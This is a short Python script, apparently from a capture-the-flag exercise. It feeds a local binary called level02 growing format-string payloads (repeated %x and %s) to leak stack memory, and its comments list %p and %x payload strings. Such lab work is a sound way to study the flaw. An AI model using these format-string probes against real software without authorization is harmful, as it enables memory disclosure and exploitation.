import subprocess
import sys

# iterations from argv
iterations = int(sys.argv[1])

for i in range(0, iterations):
    str = "%x" * i + "%s"

    # AABBCCDDEEFF*10 to fill buffer to make it easier to find since it prints as hexa
    input = str + "\n" + "AABBCCDDEE"*10 + "\n" # AAAAAA are actually not used at all so we don't care about them
    p = subprocess.Popen(["./level02"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out = p.communicate(input=input)[0]
    print("Input: " + str)
    print("Output: " + out)

# max number of %p: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p (42)


# %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x